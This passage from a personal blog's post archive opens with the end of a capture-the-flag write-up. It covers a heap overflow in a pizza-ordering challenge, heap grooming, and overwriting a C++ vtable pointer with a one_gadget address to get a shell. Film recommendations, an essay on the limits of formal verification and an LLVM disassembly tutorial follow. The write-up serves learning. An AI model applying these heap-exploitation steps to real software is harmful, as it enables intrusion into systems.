detect/decompile jump tables for some reason, so here’s the assembly of the overflow: 1234567891011121314151617.text:00000000000020BB cmp [rbp+var_1], 0.text:00000000000020BF jz loc_2154.text:00000000000020C5 lea rdi, aLastChanceExpl ; &quot;last chance, explain yourself: &quot;.text:00000000000020CC mov eax, 0.text:00000000000020D1 call printf.text:00000000000020D6 lea rax, global_customer.text:00000000000020DD mov rax, [rax].text:00000000000020E0 mov rax, [rax+20h].text:00000000000020E4 mov esi, 300 &lt;-------- length.text:00000000000020E9 mov rdi, rax &lt;-------- explanation pointer.text:00000000000020EC call another_fread.text:00000000000020F1 lea rdi, aTooBadNoExplan ; &quot;too bad, no explanation is reasonable. &quot;....text:00000000000020F8 call puts.text:00000000000020FD lea rax, global_customer.text:0000000000002104 mov rax, [rax].text:0000000000002107 mov byte ptr [rax+41h], 1.text:000000000000210B jmp short loc_2154 This overflow allows us to overwrite whatever is after the explanation in the heap. With some grooming, we can try to get a Pizza object placed right after our explanation, so we can overwrite its contents — namely, the C++ vtable pointers for class functions. A Pizza on the heap looks like this: 123450x5555557731C0: 0000000000000000 0000000000000041 | ........A&gt; &lt;---- Pizza chunk. size of Pizza chunk=0x410x5555557731D0: 000055555575FC00 0000555555773210 | ..uUUU...&gt; &lt;---- ptr to ingredients ^ | ptr to a &quot;printPizza&quot; function The goal, of course, is to overwrite the printPizza vtable ptr to a pointer to one_gadget, so that the next time we print the pizza in admire, we get a shell. How do we ensure that the Pizza is placed right after our Customer’s explanation? If we malloc and free a large explanation, its free space will be used for other objects, and if we are lucky, a Pizza. 1234567891011120x555555773120: 0000000000000000 0000000000000041 | ........A&gt; &lt;---- Customer&#x27;s explanation chunk0x555555773130: 00005555557731A0 00005555557731C0 | .1wUUU...&gt;0x555555773140: 00005555557731C0 0000555555773170 | .1wUUU..p&gt;0x555555773150: 0000555555773190 0000555555773190 | .1wUUU...&gt;0x555555773160: 4646464646464646 0000000000000031 | FFFFFFFF1&gt;0x555555773170: 0000555555773180 0000000000000004 | .1wUUU...&gt; Other junk0x555555773180: 46464600858D9FF0 4646464646464646 | .....FFFF&gt;0x555555773190: 4646464646464646 0000000000000031 | FFFFFFFF1&gt;0x5555557731A0: 00005555557731B0 0000000000000004 | .1wUUU...&gt;0x5555557731B0: 46464600858D9FF0 4646464646464646 | .....FFFF&gt;0x5555557731C0: 4646464646464646 0000000000000041 | FFFFFFFFA&gt; &lt;---- Pizza object&#x27;s heap chunk0x5555557731D0: 000055555575FC00 0000555555773210 | ..uUUU...&gt; &lt;---- Pizza object Lovely! Now, we perform our overflow, first writing one_gadget to the heap, then overflowing the Pizza with the heap ptr to one_gadget. 1234560x555555773120: 0000000000000000 0000000000000041 | ........A&gt;0x555555773130: 00007FFFF74BA26A 00007FFFF74BA26A | j.K.....j&gt; &lt;---- address of one_gadget &lt;-----| 0x555555773140: 5A5A5A5A5A5A5A5A 5A5A5A5A5A5A5A5A | ZZZZZZZZZ&gt; |... |0x5555557731C0: 5A5A5A5A5A5A5A5A 5A5A5A5A5A5A5A5A | ZZZZZZZZZ&gt; &lt;---- Pizza object&#x27;s heap chunk |0x5555557731D0: 0000555555773130 0000555555773130 | 01wUUU..0&gt; &lt;---- Overwritten vtable ptr, points to And when admire is called, 123456789101112131415161718192021222324252627282930313233------------------- USER MENU -------------------(O)rder more pizzas(C)ook all pizzas(A)dmire cooked pizzas(L)eaveChoice: Admire these beauties... (3)[*] Switching to interactive mode ___ | ~~--. |%=@%%/ |o%%%/ __ |%%o/ _,--~~ | |(_/ ._ ,/&#x27; m%%%%| |o/ / `\\. /&#x27; m%%o(_)%| |/ /o%%m `\\ /&#x27; %%@=%o%%%o| /(_)o%%% `\\ / %o%%%%%=@%%| /%%o%%@=%% \\ | (_)%(_)%%o%%| /%%%=@(_)%%% | | %%o%%%%o%%%(_|/%o%%o%%%%o%%% | | %%o%(_)%%%%%o%(_)%%%o%%o%o%% | | (_)%%=@%(_)%o%o%%(_)%o(_)% | \\ ~%%o%%%%%o%o%=@%%o%%@%%o%~ / \\. ~o%%(_)%%%o%(_)%%(_)o~ ,/ \\_ ~o%=@%(_)%o%%(_)%~ _/ `\\_~~o%%%o%%%%%~~_/&#x27; `--..____,,--&#x27;$ lsflag$ cat flagOOO&#123;cr1m1n4l5_5h0uld_n07_b3_r3w4rd3d_w17h_fl4gs&#125; I learned the unsorted bin leak trick from Samurai’s Gulshan Singh in one of his writeups, who in turn learned it from PPP. References https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/malloc_state.html https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/","categories":[{"name":"CTF","slug":"CTF","permalink":"http://raywang.tech/categories/CTF/"}],"tags":[{"name":"writeups","slug":"writeups","permalink":"http://raywang.tech/tags/writeups/"}]},{"title":"My Favorite Films of All Time","slug":"My-Favorite-Films-of-All-Time","date":"2018-01-23T10:40:02.000Z","updated":"2024-08-29T06:03:14.439Z","comments":true,"path":"2018/01/23/My-Favorite-Films-of-All-Time/","permalink":"http://raywang.tech/2018/01/23/My-Favorite-Films-of-All-Time/","excerpt":"I discovered my interest in film at the start of college. As an arts reviewer for The Tech, MIT’s student newspaper, I had the luxury of attending advance press screenings of big-name films like Suicide Squad and the final Hobbit film. But more importantly, my reviews cultivated an appreciation for the medium and an insatiable desire to experience all it had to offer. Since then, I’ve devoured films of all genres and eras, directors and actors, cinematographers and writers.","text":"I discovered my interest in film at the start of college. As an arts reviewer for The Tech, MIT’s student newspaper, I had the luxury of attending advance press screenings of big-name films like Suicide Squad and the final Hobbit film. But more importantly, my reviews cultivated an appreciation for the medium and an insatiable desire to experience all it had to offer. Since then, I’ve devoured films of all genres and eras, directors and actors, cinematographers and writers. With several years of movie-going and analysis under my belt, I decided it was time to compile a running list of my favorite films of all time. Some of them top all critics’ lists of greats, others are cult classics. I’ll explain what I find so good about each one and why they have endless replay value for me. I’ll categorize these films pretty arbitrarily — by genre, director, or other similarities. In addition, I won’t try to compare them across categories — that’s not very meaningful, and just trust me that they’re all equally as good and worth watching. Drama This might be my favorite category. Dramas rest on the quality of their dialogue, narrative, cinematography, and characterization — no special effects or action sequences to bolster them. As such, they’re some of the most pure examples of the art of filmmaking. Glengarry Glen Ross (1992) It’s not hard to tell that this film is adapted from a Pulitzer- and Tony-winning play. It’s got the best dialogue of any film I’ve ever seen, and takes place mostly in a single set across a single 12-hour timespan. With an all-star cast including Al Pacino, Kevin Spacey, Ed Harris, Jack Lemmon, and Alec Baldwin, this seemingly mundane office drama about competing real estate salesmen hits hard out of nowhere. American Beauty (1999) I can’t explain why I like this film so much. Perhaps it’s the film’s transcendentalist ambitions, or the theme of achieving personal freedom, that’s so striking and resonant. The evolution of each member of a suburban family, particularly protagonist patriarch Lester Burnham (Kevin Spacey), as they each rediscover themselves, is oddly fixating — like a coming-of-age for adults. To me, it’s hauntingly beautiful and nuanced, and it only grows in my estimation the more I rewatch it. The Shawshank Redemption (1994) This prison drama regularly tops ‘greatest films of all time’ lists. It tells the incredible story of a gentle but inscrutable banker, Andy Dufresne (Tim Robbins), wrongfully imprisoned for life at Shawshank penitentiary for his wife’s murder, as he tries to find meaning and beauty in a place devoid of it. Narrated through the lens of Red (Morgan Freeman), his best friend in prison, the story is as moving and heart-wrenching as an exquisite caged bird — never meant to be locked up, but a reminder of hope in dark places. Good Will Hunting (1997) Another undisputed all-time great, Good Will Hunting is about a 20-year-old South Boston kid, gifted with hidden genius but marred by a troubled childhood, who is taken under the wing of an MIT math professor and a therapist. Robin Williams, alongside a young Matt Damon, lends genuine feeling to this brilliant exploration of a singularly remarkable and fragile character. Taylor Sheridan I watched each of these three films, among the best I’ve ever seen, before discovering the connection between them: they were all written or directed by Taylor Sheridan, who’s only gotten into writing/directing the past several years. These films reveal that we’re witnessing a special talent emerge — all three are master classes in stomach-turning suspense, compelling characterization, and uncompromising realities. They resonate with me like no other set of films does. Sicario (2015) An FBI agent, Kate Macer, is enlisted by a government task force that is hell-bent on taking down a Mexican drug boss. Of the elements that make this film a must-see, action is not the most important. It’s about the combination of the suspense, the cinematography, and the score, that immerse you in the harsh realities of the drug war. This film is also one of many reasons why Emily Blunt is the most badass actress doin’ it out there. Wind River (2017) Speaking of harsh realities, a neo-Western murder mystery on the Wind River Indian Reservation. Against the bleak, frigid backdrop of winter in Wyoming, a US Fish and Wildlife hunter (Jeremy Renner) and an FBI agent (Elizabeth Olsen) investigate the rape and death of a reservation girl. It highlights the inescapable, crushing existence of reservation life and the perils facing Native Americans, especially women. The magnificent writing behind the characters drives this film — because “out here, you survive or you surrender. That’s determined by your strength. Your spirit.” And Sheridan shows us he and his characters have both. Hell or High Water (2016) “Sure seems foolish … The days of robbing banks and living to spend the money’s long gone, ain’t they? … Long gone for sure…” Two Texan brothers (Chris Pine and Ben Foster) begin a well-planned bank-robbing scheme to prevent their late mother’s ranch from being foreclosed, as a pair of Texas rangers close in on them. As with the other Sheridan films, it’s not about the action. It’s about how you can capture so much of the human condition in two characters and how bold storytelling can create an irresistible film-watching experience — one that audiences should love all the more because it’s so rare. Tarantino Director Quentin Tarantino deserves a category all his own. In 20 years, he’s made only eight movies (Kill Bill counts as one). But, he’s said that he might only do two more and call it a career — and it’s a testament to his sensational filmmaking style that ten films would be enough to solidify an unforgettable oeuvre. Much like the genre-benders category below, Tarantino’s films defy easy categorization. There’s always stylish, self-indulgently cheesy violence, black comedic elements, and engrossing dialogue that is at times menacing and satirical (and often both). A pastiche of Westerns, war films, and gangster flicks, Tarantino’s works are like an intravenous injection of pure extravagance. Here’s my top five, ranked: Pulp Fiction (1994) Some of my friends don’t understand this film at all. That disappoints me, since I consider it to be sublime, classic Tarantino whatever way you slice it. With several non-chronological, intertwined narratives, Pulp Fiction rests on its seat-gripping dialogue and storytelling. Inglourious Basterds (2009) A WWII black comedy where a group of Jewish-American guerrillas called the Basterds wreak havoc behind German lines with panache and pleasure. Probably Tarantino’s most universally appealing film, so you have no excuse to not see it. Reservoir Dogs (1992) Tarantino’s first big film, Reservoir Dogs deceives you into thinking that it hews closely to a conventional crime film, but veers into something much more exciting — a gangster whodunit with a sensational ensemble cast. Replete with flashbacks and dramatic irony, this is what you discover when you crave more Tarantino. The Hateful Eight (2015) His most recent work, this post-Civil War Western mystery film could really be a play — it takes place almost entirely in a one-room Wyoming lodge during a snowstorm. A bounty hunter taking in his live quarry to hang. But are all the lodgers who they say they are? Django Unchained (2012) A freed slave, Django (Jamie Foxx), joins forces with a charismatic and blasé German bounty hunter (Christoph Waltz), becoming a hilarious and effective criminal-killing duo in this Western pastiche. It’s violent, explosive, relevant, and witty — what more could you ask for in a Tarantino? Sci-Fi The Martian (2015) Ignore the scientific inaccuracies for a moment, and consider this film as a triumph of human ingenuity. When astronaut Mark Watney (Matt Damon) is mistakenly left on Mars by his crew, with no communications to Earth, he has to survive in the harshest conditions known to man. Damon, playing the resourceful and witty botanist, anchors a tour de force that makes me proud of the (hypothesized) competence and ingenuity displayed by our space organizations. Star Trek (2009) and Star Trek: Into Darkness (2013) Not your father’s Star Trek! More action than intellect, this electrifying 2009 space adventure and its 2013 sequel feature a fresh ensemble cast of Chris Pine, Zachary Quinto, Zoe Saldana, Karl Urban, and others. Set in an alternate timeline from the earlier Star Trek franchise, this USS Enterprise reboot is energetic, forceful, and universally appealing, while maintaining many original story elements. Action/Adventure John Wick (2014) Keanu Reeves has got to be one of the best, most hard-working action stars. In this film, which has gained an astonishing cult following, he plays a retired hitman of few words who seeks revenge after the theft of his car and murder of his dog, a gift from his late wife. There are two aspects that make this an all-time great action film: the world-building and the fight choreography. An entire underground assassin ecosystem is already established when the film starts — replete with parlance, strict codes of conduct, a ‘hotel for hitmen’, and its own currency. Every encounter with past friend or foe clue the audience that John Wick was once, and still is, revered and feared in the criminal underground. Reeves also trained extensively in an unconventional style of fighting called ‘gun-fu’, which combines martial arts with fast-paced, close-quarters gunplay. It’s a dizzying rate of clean kills, and combined with a fascinating and well-constructed universe, leaves the audience with a desire for more. Mad Max: Fury Road (2015) This is the only Mad Max film I’ve seen, but it deserves a place among the best action films of all time. In post-apocalyptic Australia, the protagonist, a survivor named Max Rockatansky, (Tom Hardy), is captured by a car-worshipping group called the War Boys. He’s then caught in the middle of an all-out, high-speed desert pursuit between their tyrannical leader, Immortan Joe, and his lieutenant, Imperator Furiosa (Charlize Theron). The action and stunt sequences are beyond belief. Extravagant fight scenes takes place mostly on and around dozens of speeding vehicles, which are themselves frankensteined works of art. Every detail of this post-apocalyptic wasteland, including costume and set design, is visually sumptuous. Animated I’ve probably watched these animated films, most of them Pixar classics, dozens of times each. I’m sure they’re all so popular that they need no description, but I’ll try to briefly justify my ranking. The Incredibles (2004) The best superhero film ever. Makes Marvel look like a wannabe rich kid. I first saw this as a kid, and having rewatched it many times since, I’m amazed at the layers with which it appeals to a wide range of audiences. Kung Fu Panda (2008) The treatment of the central theme of this film, believing in yourself, has surprising depth. I also love the humor and camaraderie of the voice cast, including Jack Black, Jackie Chan, Angelina Jolie, Lucy Liu, and Seth Rogen. Of course, the animal animations of well-known Chinese kung fu styles (Mantis, Tiger, Monkey) are splendid. Ratatouille (2008) “Anyone can cook!” A rat becoming one the top chefs in Paris is such an absurd yet brilliant idea that I’m amazed Pixar was able to pull it off at all, much less to perfection. But it’s how this film weaves animal and human interactions that lends it warmth, realism, and sincerity. Finding Nemo (2003) When I imagine the splendor and vastness of the ocean, Finding Nemo is first in my thoughts. Thomas Newman’s score, emphasizing delicately plucked harp and strings, is truly the soundtrack of the deep blue. Cars (2006) Considered Pixar’s most middling franchise, Cars is underappreciated, in my opinion. I like the message of humility and friendship as the keys to success and happiness, and talking cars were animated in surprisingly creative ways. Nolan’s Thrillers Everyone knows director Christopher Nolan’s recent, high-profile, epic works (Interstellar, Inception). But his earlier thrillers are arguably better: they’re less bombastic, with all the psychological twists and turns that have made him so popular among audiences who liked to be challenged. Memento (2000) Try to keep up. This neo-noir film boasts a nonlinear storyline from the perspective of an unreliable narrator (Guy Pearce) with anterograde amnesia (inability to form new memories). He’s hunting for the “John G” who killed his wife and caused his brain injury. Along the way, your footing on the film slips every scene, constantly revising what you think you know, finally delivering an ending that will leave you catatonic in contemplation for at least a week afterwards. The Prestige (2006) Two rival stage magicians in 19th century London (Hugh Jackman and Christian Bale), once friends but turned bitter enemies, each go to great lengths attempting to outdo the other. As you absorb this enthralling mystery-thriller of illusion and deception, be careful of the stage shifting beneath you — Nolan’s wildest twist catches some off guard, but also makes the film that much more staggering. Superhero The Dark Knight (2008) Just the opening scene, which carves Heath Ledger’s riveting performance of The Joker into the audience’s long-term memory, is enough to elevate this film to the best superhero flick of all time. Uniquely brooding and tonal, but never straying into cynicism, Nolan’s The Dark Knight is an intricate, epic-ly choreographed struggle between two deeply fascinating opposing forces — an agent of chaos in The Joker, and a jaded, but ever-unbreakable Batman (Christian Bale). Layered with symbolism, rife with acute commentary on human nature and the struggles endemic to urban sociopolitics, this is the superhero film that intellectual fans deserve, but also one the world needs right now. Avengers: Infinity War (2018) A film like this shouldn’t be possible. If you had told me that a film was going to attempt to weave more than 40 superheroes and villains into a 2-hour running time, most with complete backstories and motives, I would have thought you were crazy. But Marvel has invested $4 billion and 19 films to make it possible — and it worked, on a jaw-dropping scale. After all of the buildup, it truly felt like the universe was at stake in this film — or at least, the collective hopes of a hundred million moviegoers. Worth infinite rewatches, if only to milk it for every second of every character that audiences have come to love, this movie is a marvel of its own. Genre-benders Anything that I couldn’t categorize neatly with other films, I put here. This collection of sometimes peculiar movies is among my favorites, and I consider myself a lucky and keen critic for having discovered and appreciated them all. One thing that unifies them (perhaps the only thing) is that they defy genre conventions, as you’ll see. Eternal Sunshine of the Spotless Mind (2004) This might be called a sci-fi rom-com drama… but who knows. All that matters is that it’s a stellar performance from Jim Carrey and Kate Winslet, who play an estranged couple that have gotten their memories of each other removed by an eccentric New York firm, yet find themselves attracted to each other again. The treatment of sci-fi neuroscience and romantic redemption creates a heartfelt yet bizarre film-watching experience, and it’s achieved a strong cult following since its 2004 release. Who Framed Roger Rabbit (1988) If you were to ask me what film involved the most technical challenges and jaw-dropping production quality, it wouldn’t be what you’d expect — I’d say the 1988 live-action/animated fantasy Who Framed Roger Rabbit. It’s set in a Hollywood where familiar cartoon characters are actually real entities that interact with humans and act in “live-action” cartoon films. With amazingly realistic interactions between dozens of drawn characters and real actors, this noir mystery is impressive even today. Note, it’s actually geared towards adults, with all the sexual and alcoholic trappings of stylish Hollywood crime drama. The Cabin in the Woods (2012) Horror comedy has a well-deserved bad rap, but the one gem that is The Cabin in the Woods justifies the existence of an entire genre. I can’t spoil its insane twists, but trust me when I say that if you think you know this story, SORRY, YOU DON’T!! Watch this film and prepare to be blown away. Hot Fuzz (2007) From Edgar Wright, the virtuoso of visual comedy, this 2nd installment in the Cornetto trilogy is deliriously good. You might know Wright from Baby Driver, but this video essay explains why this director is even more renowned for his singular brand of humor and storytelling. Hot Fuzz has hints of action/adventure parody, mystery drama, and black comedy in a quiet British country town, all happening on the same Edgar Wright playground of a screen. Coming-of-age This is not a genre that I normally watch very much of, even though there are so many acclaimed films that come out of it. But occasionally, I venture into it and stumble upon some gems, making me very glad I went outside my comfort zone. Eighth Grade (2018) Within the first twenty seconds of this film, I knew that it would be something entirely in its own class. Earth-shattering in its genuineness and potency, it stands as one of the best films I’ve ever seen, not just in the coming-of-age genre. It’s a small slice of 8th grade life, with a brilliant Elsie Fisher as the character in which we see so much of our human capacity for simultaneous fragility and courage — amplified, as many things are, by youth. It’s so forceful in its truthfulness, and so rare in its storytelling, in a way that I never even imagined was possible. Even after seeing it, I still can’t believe that a film was able to accomplish so much. And that’s it for now! As I said, I’ll be adding more categories/films over time, so stay tuned! var options = { rowHeight: 140, margins: 4, lastRow: 'justify' }; $('.justified-gallery').justifiedGallery(options);","categories":[{"name":"Reviews and Recs","slug":"Reviews-and-Recs","permalink":"http://raywang.tech/categories/Reviews-and-Recs/"}],"tags":[{"name":"Film","slug":"Film","permalink":"http://raywang.tech/tags/Film/"},{"name":"Best of","slug":"Best-of","permalink":"http://raywang.tech/tags/Best-of/"}]},{"title":"Formal Verification: The Gap Between Perfect Code and Reality","slug":"Formal-Verification:-The-Gap-between-Perfect-Code-and-Reality","date":"2017-12-20T20:07:02.000Z","updated":"2024-08-29T06:03:14.439Z","comments":true,"path":"2017/12/20/Formal-Verification:-The-Gap-between-Perfect-Code-and-Reality/","permalink":"http://raywang.tech/2017/12/20/Formal-Verification:-The-Gap-between-Perfect-Code-and-Reality/","excerpt":"Thanks to Vlad Brown and Drawings Team for Russian and Uzbek translations. In Fall 2017, I took MIT’s 6.826, Principles of Computer Systems, taught by Turing Award-winner Butler Lampson, Nickolai Zeldovich, and Frans Kaashoek. Despite its rudimentary title, it’s a grad class on building formally verified systems. Using the proof language Coq, we wrote specifications, implementations, and proofs of toy structures: a remapped disk, an atomic pair of blocks, and a replicated disk. We also read quite a few papers from the state-of-the-art in formal methods. I went into the class believing that formal verification is the future — the only solution to a world of software ridden with bugs and security issues. But after recent events and a semester of trying to apply formal methods, I’m a serious skeptic. In this post, I’ll discuss why I think formal verification has a long way to go — and why it just doesn’t work right now.","text":"Thanks to Vlad Brown and Drawings Team for Russian and Uzbek translations. In Fall 2017, I took MIT’s 6.826, Principles of Computer Systems, taught by Turing Award-winner Butler Lampson, Nickolai Zeldovich, and Frans Kaashoek. Despite its rudimentary title, it’s a grad class on building formally verified systems. Using the proof language Coq, we wrote specifications, implementations, and proofs of toy structures: a remapped disk, an atomic pair of blocks, and a replicated disk. We also read quite a few papers from the state-of-the-art in formal methods. I went into the class believing that formal verification is the future — the only solution to a world of software ridden with bugs and security issues. But after recent events and a semester of trying to apply formal methods, I’m a serious skeptic. In this post, I’ll discuss why I think formal verification has a long way to go — and why it just doesn’t work right now. Try it — I dare you First, let’s talk about how we get a system that we can rubber-stamp as “formally verified”. Simulation proofs There are two broad ways to write a formally verified system. The first, the more conventional way, involves carefully constructing specifications of the behavior of a system, an implementation of the system, and then manually writing proofs that the implementation matches the spec. All of this is written in a theorem-proving language like Coq, and then extracted to OCaml or Haskell for a runnable implementation. From personal experience with 6.826 labs, this is a nightmare. First, the proof burden is huge — for MIT’s FSCQ file system, developed over about 1.5 years using Coq, the complete system was 10x more code than a similar unverified filesystem. Imagine that — 2000 lines of implementation become 20,000 lines of proof! This is partly because Coq is a very general language for reasoning about mathematical logic, and it has little built-in machinery for specialized applications such as complex computer systems. So, we need to build infrastructure from scratch, as well as define our systems from the ground up — from bits and bytes into entire disks. The labs were largely spared this ridiculous proof burden due to a lot of automation and infrastructure provided by the instructors. Indeed, 2700 lines of Coq (LoC) are devoted to proof infrastructure — and, in the case of the toy replicated disk lab, another 1500 lines for the actual system. Where does all this overhead come from? Well, we need to support what’s called a “simulation proof”. In this proof style, we step through every procedure in our system and show that every reachable state in our implementation has a corresponding state in our spec. Our spec for each procedure contains three conditions — a precondition, a postcondition, and a crash condition that is true if our code suddenly crashes. Then, our proof involves several things: Establish that the precondition of our procedure holds Prove every line/branch of the procedure is a valid transition If there are no crashes at the end of execution, prove the postcondition holds If crashes happened before the end of execution, then prove the crash condition holds before each crash, the crash recovery procedure is a valid transition, and the postcondition ends up holding Here’s a diagram of a single transition, showing the correspondence between a code state and a spec state. The double arrows are what we need to prove. 123456 spec semanticsforall state ===================&gt; exists state&#x27; ^ ^^ | || V code semantics VV forall w -----------------------&gt; forall w&#x27; In the FSCQ code, 6000 of 32,000 LoC were devoted to just this infrastructure. I want to highlight that we need to prove every possible code path — exponentially many in the number of conditional statements, and doubled by considering a crash at every point. Loops need to be proved inductively. On top of all that, if any spec or implementation changes even slightly, all the specs, impls, and proofs that depend on it will change as well. This makes even small changes a huge pain. Is there any other way, you ask, before you shoot yourself? Push-button proofs Another way is the “push-button” style, which formulates the spec and implementation states as symbolic SMT equations that can be passed to a solver, such as Z3. This allows Z3 to automatically verify the system, without writing any manual proofs. Z3 might, for example, check whether each code operation satisfies a formula defining the relationship between code and spec states. The main effort here is cleverly designing a set of verifiable specs that is actually scalable. It’s hard to determine whether a problem is tractable for Z3, and you have to play all sorts of tricks to make it work. For example, the writers of Yggdrasil, a push-button verified filesystem, spent 4 months exploring ways to scale verification, 2-3 months building their system, and at least 6 more months experimenting with optimizations. In the end, among other wild tricks, they rely on a stack of five layered abstractions, so the solver only has to reason about one layer at a time and won’t get stuck. What goes wrong? After all this effort, either carefully designing specs that are amenable to push-button verification, or tediously writing proofs in Coq, what do we get? You’d hope for perfect code, but the truth is a lot less palatable. The guarantees of a formally verified system rest entirely on the assumptions of the system, including its trusted computing base (TCB). The TCB of a verified system includes the specs, which are manually written and hoped (fingers crossed!) to be correct, the verification tools (e.g., Coq engine, Z3, compiler), and the runtime infrastructure (OS, hardware). This should be a huge red flag. For instance, if you’ve used Z3, you’ll agree that it’s black magic to everyone except the developers, and my professors confess that they’ve found correctness bugs, especially in decidability theories that are not commonly used. An empirical study One of the papers we read, An Empirical Study on the Correctness of Formally Verified Distributed Systems, thoroughly analyzes three recent formally-verified distributed systems — two were Coq/OCaml-based, and a third was Dafny/SMT-based. The abstract says it all: Through code review and testing, we found a total of 16 bugs, many of which produce serious consequences, including crashing servers, returning incorrect results to clients, and invalidating verification guarantees. These bugs were caused by violations of a wide-range of assumptions on which the verified components relied. Among other serious consequences were command injection and data loss, in supposedly formally verified systems! I want to discuss some of these bugs, including where and how they were found. Most of these bugs were found through static analysis of the specs and implementations, as well as conventional debugging and network and file system fuzzing. These bugs generally occurred at the interfaces between verified and unverified components. 11 occurred at what the authors call the shim layer, the OS interface that includes system calls and other primitives. When the verified components do not exactly model the real-world OS implementation, serious bugs arise. For instance, not escaping metacharacters or not handling all possible syscall error codes caused incorrect results, leading to command injection and data loss. Real-world resource limits, such as too-large packets or stack exhaustion, also broke assumptions and crashed or hung the distributed system. The remaining bugs were due to incomplete or incorrect specs, and critical issues with the verification tools themselves. In particular, these provers were not fail-safe — SIGINTs, exceptions, or other verifier crashes would cause the prover to report that verification succeeded! As if that’s not concerning enough, there’s two recent headlines in which supposedly formally verified systems had alarming bugs, in one case with disastrous security consequences. KRACK and CompCert Big news back in October was the KRACK attack on WPA2-protected WiFi networks. Cryptographer Matt Green sums it up nicely. The two parts of WPA2 — the 4-way handshake and the encryption protocol — have security proofs; the 4-way handshake was even formally verified in 2005! However, no one reasoned about how these two parts interacted in real-world code, leading to almost every single implementation on the planet being vulnerable to a catastrophic Key Reuse attack that can lead to full decryption and forgery of WiFi traffic. A smaller issue is a recent parsing bug in CompCert, a formally verified C compiler released in 2008. The bug is an amateur scoping issue, where a variable declared in the scope of a for loop clobbers a global variable with the same name. Although the CompCert paper explicitly says that the parsing step, as well as the assembling/linking steps, are not verified, this kind of bug is a huge blow to the credibility of formal methods. It really makes you wonder what sort of bugs formal verification is supposed to catch. Is there hope? Formal verification may not totally be wishful thinking. I’m hanging onto the hope that there is a place for it, and there’s some evidence to support this. In the empirical study, no bugs were found in the implementation of complex and error-prone distributed protocols (Paxos, RAFT). This shows that verification can be applied to increase reliability. And John Regehr’s compiler bug-hunting paper reported that CompCert did not have any runtime wrong-code errors, which were found in 10 other compilers. But the guarantees that we expect are much stronger than a correct protocol, handshake, or compiler optimization. We need the entire system to be reliable, and we need proof effort to be minimal for widespread adoption to be feasible. The bottom line is that formal methods will languish in academic circles, unable to bridge the gap with the real, nonsensical world, for a long time to come.","categories":[{"name":"Formal Methods","slug":"Formal-Methods","permalink":"http://raywang.tech/categories/Formal-Methods/"}],"tags":[{"name":"Coq","slug":"Coq","permalink":"http://raywang.tech/tags/Coq/"}]},{"title":"Using the LLVM MC Disassembly API","slug":"Using-the-LLVM-MC-Disassembly-API","date":"2017-12-04T22:40:26.000Z","updated":"2024-08-29T06:03:14.440Z","comments":true,"path":"2017/12/04/Using-the-LLVM-MC-Disassembly-API/","permalink":"http://raywang.tech/2017/12/04/Using-the-LLVM-MC-Disassembly-API/","excerpt":"In this post, I’ll walk through how to link an application against LLVM and show a simple usage of the LLVM McDisassembler API. It’s a little more complex that it seems, probably because there’s not many good resources for using this API.","text":"In this post, I’ll walk through how to link an application against LLVM and show a simple usage of the LLVM McDisassembler API. It’s a little more complex that it seems, probably because there’s not many good resources for using this API. Linking a program with LLVM The handy llvm-config utility, which comes with LLVM, can be used to determine the compiler/linker flags you need for LLVM. The relevant options are --ldflags, --cxxflags, and --libs. Let’s see what the output of these will be. 1234567891011&gt; llvm-config --ldflags-L/usr/local/lib -lz -lpthread -ldl -lm&gt; llvm-config --cxxflags-I/usr/local/include -D_DEBUG -D_GNU_SOURCE -D__STDC_CONSTANT_MACROS -D__STDC_FORMAT_MACROS -D__STDC_LIMIT_MACROS -O3 -fomit-frame-pointer -fvisibility-inlines-hidden -fno-exceptions -fno-rtti -fPIC -Woverloaded-virtual -Wcast-qual&gt; llvm-config --libs-lLLVMLTO -lLLVMLinker -lLLVMipo -lLLVMVectorize -lLLVMBitWriter -lLLVMTableGen -lLLVMDebugInfo -lLLVMOption -lLLVMX86Disassembler -lLLVMX86AsmParser -lLLVMX86CodeGen -lLLVMSelectionDAG-lLLVMAsmPrinter -lLLVMX86Desc -lLLVMX86Info -lLLVMX86AsmPrinter -lLLVMX86Utils -lLLVMIRReader-lLLVMBitReader -lLLVMAsmParser -lLLVMMCDisassembler -lLLVMMCParser -lLLVMInstrumentation -lLLVMInterpreter -lLLVMMCJIT -lLLVMJIT -lLLVMCodeGen -lLLVMObjCARCOpts -lLLVMScalarOpts-lLLVMInstCombine -lLLVMTransformUtils -lLLVMipa -lLLVMAnalysis -lLLVMRuntimeDyld -lLLVMExecutionEngine -lLLVMTarget -lLLVMMC -lLLVMObject -lLLVMCore -lLLVMSupport If you have a C++ file that includes LLVM headers, first, compile your application to a .o object file with the -c option of g++, which tells it not to run the linker. 1g++ -std=c++11 -I/home/raywang/panda -c -o panda/tools/slice_analyzer.o panda/tools/slice_analyzer.cpp Now, we want to link this .o file against LLVM. The tricky thing is that you can’t just add llvm-config --ldflags --cxxflags --libs to g++, because the order of these flags matters. When linking libraries, the linker goes from left to right through the libraries, building up a list of missing symbols and resolving symbols as it encounters new libraries. However, it does not search backwards for symbols! So, if you specify a library too early in the command, it will never get used, even when other libraries depend on it! The correct way to link is to first specify the cxxflags and libs, then the ldflags like so: 1g++ panda/tools/slice_analyzer.o -o slice_analyzer `llvm-config --cxxflags --libs` `llvm-config --ldflags` Now, all the missing symbols are filled in by libraries further to the right, so the linker can work correctly! McDisassembly The LLVM MC (Machine Code) library is well-suited to large-scale disassembly applications. Let’s see the most basic way to use it. We start with a buffer of x86 assembly formatted as a std::string of hex characters: 89e5. We want to disassemble this to the mov ebp, esp instruction. You’ll need to include these header files: 12345678#include &quot;llvm/MC/MCAsmInfo.h&quot;#include &quot;llvm/MC/MCContext.h&quot;#include &quot;llvm/MC/MCDisassembler.h&quot;#include &quot;llvm/MC/MCInst.h&quot;#include &quot;llvm/MC/MCInstPrinter.h&quot;#include &quot;llvm/MC/MCInstrInfo.h&quot;#include &quot;llvm/MC/MCRegisterInfo.h&quot;#include &quot;llvm/MC/MCSubtargetInfo.h&quot; Now, initialize everything 12345678910111213LLVMInitializeAllAsmPrinters();LLVMInitializeAllTargets();LLVMInitializeAllTargetInfos();LLVMInitializeAllTargetMCs();LLVMInitializeAllDisassemblers();LLVMDisasmContextRef dcr = LLVMCreateDisasm ( &quot;i386-unknown-linux-gnu&quot;, // TripleName NULL, 0, NULL, NULL); These functions are defined in llvm/lib/MC/MCDisassembler/Disassembler.cpp. We need a handle to a LLVMDisasmContextRef for all future functions, and we can use LLVMCreateDisasm to make one. The first argument to LLVMCreateDisasm is a TripleName, which is formatted like archType-vendor-OS. I think the default vendor is 